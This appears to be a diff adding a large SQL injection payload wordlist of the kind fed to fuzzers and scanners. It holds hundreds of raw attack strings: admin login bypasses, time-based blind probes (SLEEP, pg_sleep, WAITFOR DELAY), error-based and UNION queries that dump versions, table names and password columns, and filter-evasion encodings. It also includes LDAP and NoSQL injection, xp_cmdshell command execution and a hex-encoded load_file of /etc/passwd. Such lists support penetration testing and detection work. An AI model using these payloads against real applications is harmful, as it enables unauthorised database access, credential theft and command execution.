+(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [RANDNUM] ELSE [RANDNUM]*(SELECT [RANDNUM] UNION ALL SELECT [RANDNUM1]) END))
+(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [RANDNUM] ELSE CAST(1 AS INT)/(SELECT 0 FROM DUAL) END) FROM DUAL)
+(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME]) ELSE [RANDNUM] END) FROM DUAL)
+(SELECT * FROM GENERATE_SERIES([RANDNUM],[RANDNUM],CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) LIMIT 1)
+(SELECT 1 FROM (SELECT SLEEP(50))A)
+(SELECT 2*(IF((SELECT * FROM (SELECT CONCAT('[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]','x'))s), 8446744073709551610, 8446744073709551610)))
+(SELECT [ORIGVALUE] FROM GENERATE_SERIES([RANDNUM],[RANDNUM],CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) LIMIT 1)
+(SELECT [RANDNUM] FROM (SELECT(SLEEP([SLEEPTIME])))[RANDSTR])
+(SELECT [RANDNUM] FROM PG_SLEEP([SLEEPTIME]))
+(SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+(SELECT [RANDNUM]=('[DELIMITER_START]'||(SELECT CASE [RANDNUM] WHEN [RANDNUM] THEN 1 ELSE 0 END FROM RDB$DATABASE)||'[DELIMITER_STOP]'))
+(SELECT CONCAT('[DELIMITER_START]',(ELT([RANDNUM]=[RANDNUM],1)),'[DELIMITER_STOP]'))
+(SELECT CONCAT(CONCAT('[DELIMITER_START]',(CASE WHEN ([RANDNUM]=[RANDNUM]) THEN '1' ELSE '0' END)),'[DELIMITER_STOP]'))
+(select top 1
+(SELECT UPPER(XMLType(CHR(60)||CHR(58)||'[DELIMITER_START]'||(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) FROM DUAL)||'[DELIMITER_STOP]'||CHR(62))) FROM DUAL)
+(sqlattempt2)
+(sqlvuln)
+(UPDATEXML([RANDNUM],CONCAT('.','[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]'),[RANDNUM1]))
+(||6)
+)
+) or ('a'='a
+) or (a=a
+) or benchmark(10000000,MD5(1))#
+) or pg_sleep(__TIME__)--
+) or sleep(__TIME__)='
+) union select * from information_schema.tables;
+)%20or%20('x'='x
+)) and pg_sleep(50)--
+)) and sleep(50)--
+)) or benchmark(10000000,MD5(1))#
+)) or pg_sleep(__TIME__)--
+)) or sleep(__TIME__)='
+));waitfor delay '0:0:__TIME__'--
+);waitfor delay '0:0:50';--
+);waitfor delay '0:0:__TIME__'--
+*(|(mail=*))
+*(|(objectclass=*))
+*/*
+*|
++		addition, concatenate (or space in url)
++if(ASCII(SUBSTRING((),i, 1))>k,BENCHMARK(100000000, RAND()),1)
++or+round(pi(),1)+true+true = version()
++order+by+19--
++sqlvuln
++waitfor+delay+'00:00:05'
++where 0 = 0
+,
+, $where: '1 == 1'
+,(BEGIN IF ([RANDNUM]=[RANDNUM]) THEN DBMS_LOCK.SLEEP([SLEEPTIME]); ELSE DBMS_LOCK.SLEEP(0); END IF; END;)
+,(CASE WHEN [RANDNUM]=[RANDNUM] THEN 1 ELSE NULL END)
+,(CASE WHEN [RANDNUM]=[RANDNUM] THEN [ORIGVALUE] ELSE NULL END)
+,(CAST('[DELIMITER_START]'||(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END))::text||'[DELIMITER_STOP]' AS NUMERIC))
+,(CAST('[DELIMITER_START]'||(SELECT 1 FROM GENERATE_SERIES([RANDNUM],[RANDNUM],CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) LIMIT 1)::text||'[DELIMITER_STOP]' AS NUMERIC))
+,(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN (SELECT [RANDNUM] FROM PG_SLEEP([SLEEPTIME])) ELSE 1/(SELECT 0) END))
+,(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 1/(SELECT 0) END))
+,(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE [RANDNUM]*(SELECT [RANDNUM] FROM INFORMATION_SCHEMA.PLUGINS) END))
+,(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE [RANDNUM]*(SELECT [RANDNUM] UNION ALL SELECT [RANDNUM1]) END))
+,(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE CAST(1 AS INT)/(SELECT 0 FROM DUAL) END) FROM DUAL)
+,(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [ORIGVALUE] ELSE 1/(SELECT 0) END))
+,(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [ORIGVALUE] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM INFORMATION_SCHEMA.PLUGINS) END))
+,(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [ORIGVALUE] ELSE [RANDNUM]*(SELECT [RANDNUM] UNION ALL SELECT [RANDNUM1]) END))
+,(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [ORIGVALUE] ELSE CAST(1 AS INT)/(SELECT 0 FROM DUAL) END) FROM DUAL)
+,(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME]) ELSE 1/(SELECT 0 FROM DUAL) END) FROM DUAL)
+,(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN SLEEP([SLEEPTIME]) ELSE [RANDNUM] END))
+,(select * from (select(sleep(10)))a)
+,(SELECT * FROM GENERATE_SERIES([RANDNUM],[RANDNUM],CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) LIMIT 1)
+,(SELECT [RANDNUM] FROM (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT('[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]','x'))s), 8446744073709551610, 8446744073709551610)))x)
+,(SELECT [RANDNUM] FROM (SELECT EXP(~(SELECT * FROM (SELECT CONCAT('[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]','x'))x)))s)
+,(SELECT [RANDNUM] FROM (SELECT JSON_KEYS((SELECT CONVERT((SELECT CONCAT('[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]')) USING utf8))))x)
+,(SELECT [RANDNUM] FROM (SELECT ROW([RANDNUM],[RANDNUM1])>(SELECT COUNT(*),CONCAT('[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM (SELECT [RANDNUM2] UNION SELECT [RANDNUM3] UNION SELECT [RANDNUM4] UNION SELECT [RANDNUM5])a GROUP BY x))s)
+,(SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+,(SELECT [RANDNUM] WHERE [RANDNUM]=CONVERT(INT,(SELECT '[DELIMITER_START]'+(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN '1' ELSE '0' END))+'[DELIMITER_STOP]')))
+,(SELECT [RANDNUM]=('[DELIMITER_START]'||(SELECT CASE [RANDNUM] WHEN [RANDNUM] THEN 1 ELSE 0 END FROM RDB$DATABASE)||'[DELIMITER_STOP]'))
+,(SELECT CASE WHEN [RANDNUM]=[RANDNUM] THEN 1 ELSE RAISE_ERROR(70001, '[RANDSTR]') END FROM SYSIBM.SYSDUMMY1)
+,(SELECT CASE WHEN [RANDNUM]=[RANDNUM] THEN [ORIGVALUE] ELSE RAISE_ERROR(70001, '[RANDSTR]') END FROM SYSIBM.SYSDUMMY1)
+,(SELECT UPPER(XMLType(CHR(60)||CHR(58)||'[DELIMITER_START]'||(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) FROM DUAL)||'[DELIMITER_STOP]'||CHR(62))) FROM DUAL)
+,@variable
+,EXTRACTVALUE([RANDNUM],CONCAT('\','[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]'))
+,GTID_SUBSET(CONCAT('[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]'),[RANDNUM])
+,IIF([RANDNUM]=[RANDNUM],1,1/0)
+,IIF([RANDNUM]=[RANDNUM],[ORIGVALUE],1/0)
+,RAISE_ERROR('70001','[DELIMITER_START]'||(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) FROM SYSIBM.SYSDUMMY1)||'[DELIMITER_STOP]')
+,UPDATEXML([RANDNUM],CONCAT('.','[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]'),[RANDNUM1])
+--
+-- &password=
+-- or #
+--sp_password
+-1 UNION SELECT 1 INTO @,@
+-1 UNION SELECT 1 INTO @,@,@
+-1' UNION SELECT 1,2,3--+
+-1' UNION SELECT 1,GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=0x64617461626173655F6E616D65-- -
+-1' UNION SELECT 1,GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()-- -
+-123%27%2F%2A%210LIMIT%201%2C1%2F%2A%210UNION%2F%2A%210ALL%2F%2A%210SELECT%2F%2A%210CONCAT%280x3a6267653a%2C%2F%2A%210IFNULL%28CAST%28%2F%2A%210version%28%29%2F%2A%210AS%2F%2A%210CHAR%29%2C0x20%29%2C0x3a69626b3a%29%23
+-2
+-223%27%20%2F%2A%2130631LIMIT%201%2C1%20UNION%20ALL%20SELECT%20CONCAT%280x3a6267653a%2CIFNULL%28CAST%28version%28%29%20AS%20CHAR%29%2C0x20%29%2C0x3a69626b3a%29%2A%2F%2
+/
+/**/or/**/1/**/=/**/1
+/*…*/
+//
+//*
+0
+0 or 1=1
+0^(locate(0x61,(select id from users where num=1),1)=1)
+0x730065006c0065006300740020004000400076006500 ...
+0x770061006900740066006F0072002000640065006C00 ...
+0x77616974666F722064656C61792027303A303A313027 ...
+1 AND (SELECT * FROM Users) = 1
+1 and 100>(Select ASCII(Substr(username,1,1))) from all_users where rownum<=1)
+1 AND 1=1
+1 AND 1=2
+1 and 9=8 /*!uNiOn*/ aLl /*!sElect*/ 1,2,3--
+1 and name=0x5265696E657273
+1 and substring(version(),1,1)=4
+1 exec sp_ (or exec xp_)
+1 or 1=1
+1 or benchmark(10000000,MD5(1))#
+1 or pg_sleep(__TIME__)--
+1 or sleep(__TIME__)#
+1 waitfor delay '0:0:10'--
+1" AND "1"="1
+1" AND (SELECT 1 FROM (SELECT pg_sleep(5))a)--
+1" AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)-- -
+1" OR "1"="1
+1" ORDER BY 1-- -
+1" UNION SELECT NULL,NULL,NULL-- -
+1" WAITFOR DELAY '0:0:5'--
+1##%1%2%3%%27%20%L%I%M%I%T%20%1%%2C%1%20%U%N%I%O%N%20%A%L%L%20%S%E%L%E%C%T%20%C%O%N%C%A%T%%28%0%x%3%a%6%d%7%0%6%6%3%a%%2C%I%F%N%U%L%L%%28%C%A%S%T%%28%d%a%t%a%b%a%s%e%%28%%29%20%A%S%20%C%H%A%R%%29%%2C%0%x%2%0%%29%%2C%0%x%3%a%7%3%6%e%6%2%3%a%%29%%23
+1%0Aunion%0Aselect%0A1,2,3/*
+1%1%3%%27%+%A%N%D%+%1%=%1
+1%20%20%20%20union%20%20%20%20select%20%20%20%20abc%20%20%20%20from%20%20%20%20abc
+1%20%20union%20%20select%20%20abc%20%20from%20%20abc
+1%2520union%2520select%25201,2,3/*
+1%27%20union%20select%201,2,3--
+1' AND '1'='1
+1' AND '1'='2
+1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)-- -
+1' AND (SELECT 1 FROM (SELECT SLEEP(5))A)-- (Solo si hay funciones personalizadas)
+1' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)-- -
+1' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT @@version),0x7e,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- -
+1' AND 1=(SELECT CONVERT(INT,(SELECT @@version)))--
+1' and 1=(select count(*) from tablenames); --
+1' AND 1=(SELECT UPPER(@@version))--
+1' AND 1=1--
+1' AND 1=2--
+1' AND 1=CAST((SELECT table_name FROM information_schema.tables LIMIT 1) AS INT)--
+1' AND 1=DBMS_LOCK.SLEEP(5)--
+1' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--
+1' AND BENCHMARK(5000000,MD5(1))-- -
+1' AND CAST(CHR(126)||VERSION()||CHR(126) AS NUMERIC)=1--
+1' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT @@version),0x7e))-- -
+1' AND IF(1=1,SLEEP(5),0)-- -
+1' AND UPDATEXML(1,CONCAT(0x7e,(SELECT @@version),0x7e),1)-- -
+1' GROUP BY 1,2,--+
+1' GROUP BY 1,2,3--+
+1' OR '1'='1
+1' OR (SELECT 1 FROM (SELECT pg_sleep(5))a)--
+1' OR SLEEP(5)-- -
+1' ORDER BY 1,2,3--+
+1' ORDER BY 1,2--+
+1' ORDER BY 1-- -
+1' ORDER BY 1--+
+1' ORDER BY 2--+
+1' ORDER BY 3--+
+1' UNION SELECT NULL,NULL,NULL-- -
+1' || pg_sleep(5)--
+1'%09UNION%09SELECT%09NULL,NULL-- -
+1'%0Band%0B''='
+1'%0Bunion%0Bselect%0B1,2,3
+1'%0bUNION%0bSELECT%0bNULL,NULL-- -
+1'%0Cand%0C''='
+1'%0Cunion%0Cselect%0C1,2,3
+1'%0cUNION%0cSELECT%0cNULL,NULL-- -
+1'%0Dand%0D''='
+1'%0Dunion%0Dselect%0D1,2,3
+1'&&1='1
+1') AND SLEEP(50) AND ('LoUL'='LoUL"
+1'+and+(select+pass+from+users+limit+1)='pass--
+1'+HAVING 1=1--
+1'+or+@@servername=@@servername--
+1'/*!50000UNION*//*!50000SELECT*/NULL,NULL,NULL-- -
+1'/**/UNION/**/SELECT/**/NULL,NULL-- -
+1'1
+1'; IF 1=1 WAITFOR DELAY '0:0:5'--
+1'; SELECT pg_sleep(5)--
+1'; WAITFOR DELAY '0:0:5'--
+1'<99#
+1'OR'121'='121
+1'union/*!select*/pass,load_file(0x11)from+users--
+1) and pg_sleep(50)--
+1) and sleep(50)--
+1) or benchmark(10000000,MD5(1))#
+1) or pg_sleep(__TIME__)--
+1) or sleep(__TIME__)#
+1)) and pg_sleep(50)--
+1)) and sleep(50)--
+1)) or benchmark(10000000,MD5(1))#
+1)) or pg_sleep(__TIME__)--
+1)) or sleep(__TIME__)#
+1),(version(),1,1
+1*56
+1++union++select++abc++from++abc
+1+and+100>(ASCII(Substring(user(),1,1)))
+1+and+100>(Select+top+1+ASCII(Substring(name,1,1))) from sysusers)--
+1+and+1=1
+1+and+ascii('a')=97
+1+and+ascii(lower(mid((select+pwd+from+users+limit+1,1),1,1)))=74
+1+and+ascii(lower(substring((select+pwd+from+users+limit+1,1),1,1))
+1+and+convert(int,@@servername)--
+1+and+hex('a')=61
+1+and+len(@@servername)>1--
+1+and+length(123)=3
+1+and+ord('a') = 97
+1+len(@@servername)>1#
+1+len(@@servername)>1--
+1+len(@@servername)>1/*
+1+len(@@servername)>1;%00
+1+union+select+1,2,3#
+1+union+select+1,2,3--
+1+union+select+1,2,3/*
+1+union+select+1,2,3;%00
+1+union+select+abc+from+abc
+1, $where: '1 == 1'
+1,'0');waitfor delay '0:0:50;--
+1-false
+1-true
+1/**/union%a0select/**/1,pass,3`a`from`users`
+1/*union*/union/*select*/select+1,2,3/*
+10+UNION+SELECT+LOAD_FILE(0x2f6574632f706173737764)
+123%20or%20%c0%a7%c01%a71=%c0%a71
+123%2527%2520select%2520convert(int,@@servername)--
+123%27%09LIMIT%0C1%2C1%0AUNION%04ALL%01SELECT%07CONCAT%280x3a6a7a713a%2CIFNULL%28CAST%28database%28%29%09AS%0BCHAR%29%2C0x20%29%2C0x3a79757a3a%29%23
+123%27%20LIMIT%201%2C1%20UNION%20ALL%20SELECT%20CONCAT%280x3a6d70663a%2CIFNULL%28CAST%28database%28%29%20AS%20CHAR%29%2C0x20%29%2C0x3a736e623a%29%23%20and%20%270having%27=%270having%27
+123%29%07AND%079869=8149%01AND%01%281045=1045
+123'+not+like+'1234
+123+1+5-5-1
+123+AND+md5('a')!= md5('A')
+123+len(1234)-len(123)
+123+uniOn+SeLEcT+BaNneR+FroM+v$vERsIon+WhERe+ROwNUm=1
+123/*!or*/1=1;
+1234 " AND 1=0 UNION ALL SELECT "admin", "81dc9bdb52d04dc20036dbd8313ed055
+1234 " AND 1=0 UNION ALL SELECT "root", "81dc9bdb52d04dc20036dbd8313ed055
+1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055
+1234 ' AND 1=0 UNION ALL SELECT 'root', '81dc9bdb52d04dc20036dbd8313ed055
+123K29yKycxJz0nMQ==
+15+/*!union*/+/*!all*/+/*!select*/+1,2,3,4,5,6,7--
+1;(load_file(char(47,101,116,99,47,112,97,115, ...
+1;declare+@myvar+nvarchar(80);set+@myvar=N'UNI'+N'ON%20SEL'+N'ECT%20U'+N'SER');EXEC(@myvar);
+1;SELECT%20*
+21 %
+223%29%20%20%20%20AND%20%20%20%20%208558=8593%20%20AND%20%20%20%20%20%20%285473=5473
+223%29%20AND%201701=5451%20AND%20%283835=3835%20and%20%270having%27=%270having%27
+23 OR 1=1
+23%27%20LIMIT%201%2C1%20UNION%20ALL%20SELECT%20CONCAT%280x3a6864723a%2CIF%28ISNULL%28CAST%28version%28%29%20AS%20CHAR%29%29%2C0x20%2CCAST%28version%28%29%20AS%20CHAR%29%29%2C0x3a7767793a%29%23
+23%27%20LIMIT%201%2C1%20UNION%20ALL%20SELECT%20CONCAT%280x3a6e75773a%2C%28CASE%20WHEN%20%286349=6349%2F%2A%2150521%20AND%206349=6350%2A%2F%29%20THEN%201%20ELSE%200%20END%29%2C0x3a6270793a%29%23
+23%27%20LIMIT%201%2C1%20UNION%20ALL%20SELECT%20CONCAT%280x3a6e75773a%2CIFNULL%28CAST%28CURRENT_USER%28%29%20AS%20CHAR%29%2C0x20%29%2C0x3a6270793a%29%23
+23%27%20LIMIT%201%2C1%20UNION%20ALL%20SELECT%20CONCAT%280x3a757a793a%2CIFNULL%28CAST%28version%28%29%20AS%20CHAR%29%2C0x20%29%2C0x3a736a763a%29%23%00
+23%27%23DDvIMgC%0ALIMIT%23wyQDiZxbEfWH%0A1%2C1%23vJHSbhW%0AUNION%23WfNzMdJBEP%0AALL%23AgDqJl%0ASELECT%23xRYClbEPoiuX%0ACONCAT%280x3a7372773a%2CIFNULL%28CAST%28version%28%29%23BiJwsArZs%0AAS%23FgnwSFSQ%0ACHAR%29%2C0x20%29%2C0x3a6d79643a%29%23
+23%27%23mPkKCjceC%0A%23pwsxOHFa%0ALIMIT%23GSTpANJXKGdC%0A%23uOaAVrPY%0A%23IufLHavTgnn%0A%23sRygbynG%0A1%2C1%23uRvizI%0A%23kNTIVAJnz%0AUNION%23IEVjNIbBGg%0A%23CrHaTy%0A%23PkPohIaUPUPP%0A%23ouAusiVKpxg%0A%23UTlHCuTls%0AALL%23ZdLRhsQPAkid%0A%23ObZxIruvjFbd%0A%23IxosRHsTC%0A%23lZlmVvV%0ASELECT%23FHaHzAMzvN%0A%23BWRjqHuR%0A%23BTtMGfzKairL%0A%23GvGSlRR%0A%23kbCsPv%0A%23kiirXiLzYG%0A%23RkKvrFrkKc%0ACONCAT%280x3a6267653a%2C%23TLxyzUYCN%0A%23iKDnXTOMyUX%0AIFNULL%28%23KLWKJH%0ACAST%28%23EVVXxVJ%0A%23ddeBcXdPJNK%0A%23JytbHTOvwXC%0Aversion%28%29%23OXQNXTG%0A%23JqAzVQn%0A%23uYcIYOA%0A%23xBATyw%0AAS%23SuQdAyf%0A%23hQHYtT%0A%23ReByaH%0A%23COkovdqzzcS%0A%23nJrotVbdX%0ACHAR%23NklnJgTSwC%0A%23StUlDCtwD%0A%23EHSUPhSgYLrO%0A%29%2C0x20%29%2C0x3a69626b3a%29%23%20and%20%270having%27=%270having%27
+23%27%2BLIMIT%2B1%2C1%2BUNION%2BALL%2BSELECT%2BCONCAT%280x3a6267653a%2CIFNULL%28CAST%28version%28%29%2BAS%2BCHAR%29%2C0x20%29%2C0x3a69626b3a%29%23
+23%29%20%20AND%20%20%20%208558=8593%20%20AND%20%20%20%20%285473=5473
+23%29%20AND%20%28SELECT%205524%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x3a6864723a%2C%28SELECT%20%28CASE%20WHEN%20%285524%20LIKE%205524%29%20THEN%201%20ELSE%200%20END%29%29%2C0x3a7767793a%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x%29a%29%20AND%20%287619%20LIKE%207619
+23%29%20AND%202874%20LIKE%202341%20AND%20%288194%20LIKE%208194
+23%bf%27%20LIMIT%201%2C1%20UNION%20ALL%20SELECT%20CONCAT%280x3a6d70663a%2CIFNULL%28CAST%28database%28%29%20AS%20CHAR%29%2C0x20%29%2C0x3a736e623a%29%23--%20
+23%EF%BC%87%20LIMIT%201%2C1%20UNION%20ALL%20SELECT%20CONCAT%280x3a757a793a%2CIFNULL%28CAST%28version%28%29%20AS%20CHAR%29%2C0x20%29%2C0x3a736a763a%29%23
+23+len(@@servername)-len(@@servername)
+26 %
+28 %
+29 %
+3.10E+17
+323%27%20%20AND%20%20%20%28%20%20SELECT%20%20%20%202937%20%20%20FROM%28%20%20SELECT%20%20%20%20%20COUNT%28%2A%29%2C%20%20CONCAT%280x3a6d70663a%2C%28%20%20SELECT%20%20%20%20MID%28%28%20%20IFNULL%28%20CAST%28%20%20database%28%29%20%20%20AS%20%20%20%20%20%20%20CHAR%20%20%29%2C0x20%29%29%2C1%2C50%29%29%2C0x3a736e623a%2CFLOOR%28RAND%280%29%2A2%29%29x%20%20%20%20FROM%20%20%20%20INFORMATION_SCHEMA.CHARACTER_SETS%20%20%20%20GROUP%20%20%20%20%20BY%20%20%20%20x%29a%29%20%20AND%20%20%20%27rmHN%27=%27rmHN
+323%29%20%2F%2A%2100000AND%203244=4853%20AND%20%286013=6013%2A%2F
+423%27%20%20%20%20LIMIT%20%20%201%2C1%20%20UNION%20%20%20%20%20ALL%20%20%20%20%20%20%20SELECT%20%20%20%20%20CONCAT%280x3a6d70663a%2C%20IFNULL%28%20CAST%28%20%20database%28%29%20%20%20AS%20%20%20%20%20CHAR%20%29%2C0x20%29%2C0x3a736e623a%29%23
+423%27%20%2F%2A%2100000LIMIT%201%2C1%20UNION%20ALL%20SELECT%20CONCAT%280x3a6a7a713a%2CIFNULL%28CAST%28database%28%29%20AS%20CHAR%29%2C0x20%29%2C0x3a79757a3a%29%2A%2F%23
+523%27%2F%2A%21LIMIT%2A%2F1%2C1%2F%2A%21UNION%2A%2F%2F%2A%21ALL%2A%2F%2F%2A%21SELECT%2A%2F%2F%2A%21CONCAT%2A%2F%280x3a6a7a713a%2C%2F%2A%21IFNULL%2A%2F%28CAST%28%2F%2A%21database%2A%2F%28%29%2F%2A%21AS%2A%2F%2F%2A%21CHAR%2A%2F%29%2C0x20%29%2C0x3a79757a3a%29%23
+53E%4c%45%43T%20%73%63h%65%6d%61%6ea%6de%20%46%52O%4d%20%70g%5f%74a%62%6ce%73
+6+/*!UniOn*/+/*!AlL*/+/*!SeLecT*/+1,2,3,4,5,6,version()--
+;
+; begin declare @var varchar(8000) set @var=' ...
+; exec ('sel' + 'ect us' + 'er')
+; exec master..xp_cmdshell
+; exec master..xp_cmdshell 'ping 172.10.1.255'--
+; exec xp_regread
+; execute immediate 'sel' || 'ect us' || 'er'
+; or '1'='1'
+; SLEEP(50)
+;(SELECT * FROM (SELECT(SLEEP([SLEEPTIME])))[RANDSTR])
+;/*,1*/ EXEC /*,1*/ master..xp_cmdshell /*,1*/ "ping 127.0.0.1" /*,1*/--
+;BEGIN DBMS_LOCK.SLEEP([SLEEPTIME]); END
+;BEGIN USER_LOCK.SLEEP([SLEEPTIME]); END
+;CREATE OR REPLACE FUNCTION SLEEP(int) RETURNS int AS '/lib/libc.so.6','sleep' language 'C' STRICT; SELECT sleep([SLEEPTIME])
+;DECLARE @[RANDSTR] NVARCHAR(4000);SET @[RANDSTR]=(SELECT '[DELIMITER_START]'+(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN '1' ELSE '0' END))+'[DELIMITER_STOP]');EXEC @[RANDSTR]
+;DECLARE @x CHAR(9);SET @x=0x303a303a3[SLEEPTIME];WAITFOR DELAY @x
+;IF([RANDNUM]=[RANDNUM]) SELECT [RANDNUM] ELSE DROP FUNCTION [RANDSTR]
+;IIF([RANDNUM]=[RANDNUM],1,1/0)
+;SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE [RANDNUM]*(SELECT [RANDNUM] UNION ALL SELECT [RANDNUM1]) END)
+;SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [RANDNUM] ELSE 1/(SELECT 0) END)
+;SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [RANDNUM] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM INFORMATION_SCHEMA.PLUGINS) END)
+;SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [RANDNUM] ELSE CAST(1 AS INT)/(SELECT 0 FROM DUAL) END) FROM DUAL
+;SELECT * FROM GENERATE_SERIES([RANDNUM],[RANDNUM],CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) LIMIT 1
+;SELECT CASE WHEN [RANDNUM]=[RANDNUM] THEN 1 ELSE NULL END FROM DUAL
+;SELECT DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME]) FROM DUAL
+;SELECT PG_SLEEP([SLEEPTIME])
+;SELECT SLEEP([SLEEPTIME])
+;WAITFOR DELAY '0:0:[SLEEPTIME]'
+;waitfor delay '0:0:__TIME__'--
+<>"'%;)(&+
+<username>' OR 1=1--
+<username>'--
+?
+@@variable	global variable
+@var select @var as var into temp end --
+@variable
+@variable	local variable
+[$ne]=1
+\
+\") and pg_sleep(50)--
+\") and sleep(50)--
+\")) or pg_sleep(50)--
+\")) or sleep(50)--
+\\
+\x27UNION SELECT
+`
+`)
+``
+a'
+a' or 'a' = 'a
+a' or 1=1 --
+a' or 1=1--
+a' or 3=3--
+a' waitfor delay '0:0:10'--
+a';exec+master..xp_cmdshell+'ping'--
+a';EXEC+master.dbo.xp_cmdshell+'ping'
+admin --
+admin" #
+admin" --
+admin" or "1"="1
+admin" or "1"="1"#
+admin" or "1"="1"--
+admin" or "1"="1"/*
+admin" or 1=1
+admin" or 1=1#
+admin" or 1=1--
+admin" or 1=1/*
+admin") or "1"="1
+admin") or "1"="1"#
+admin") or "1"="1"--
+admin") or "1"="1"/*
+admin") or ("1"="1
+admin") or ("1"="1"#
+admin") or ("1"="1"--
+admin") or ("1"="1"/*
+admin"/*
+admin"or 1=1 or ""="
+admin' #
+admin' --
+admin' or '
+admin' OR '1'='1
+admin' OR '1'='1'#
+admin' OR '1'='1'--
+admin' or '1'='1'/*
+admin' or 1=1
+admin' or 1=1#
+admin' or 1=1--
+admin' or 1=1/*
+admin'#
+admin') or '1'='1
+admin') or '1'='1'#
+admin') or '1'='1'--
+admin') or '1'='1'/*
+admin') or ('1'='1
+admin') or ('1'='1'#
+admin') OR ('1'='1'--
+admin') or ('1'='1'/*
+admin'--
+admin'/*
+admin'or 1=1 or ''='
+admin)(%0a|(password=*)
+admin)(|(password=*)
+ADV1
+ADVCPROD
+AND (SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN NULL ELSE CAST('[RANDSTR]' AS NUMERIC) END)) IS NULL
+AND (SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,[RANDNUM]) END) FROM DUAL) IS NULL
+and (select 1)=1
+AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT('[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]','x'))s), 8446744073709551610, 8446744073709551610)))
+AND (SELECT [RANDNUM] FROM (SELECT(SLEEP([SLEEPTIME])))[RANDSTR])
+AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+and (select substring(@@version,1,1))='M'
+and (select substring(@@version,1,1))='X'
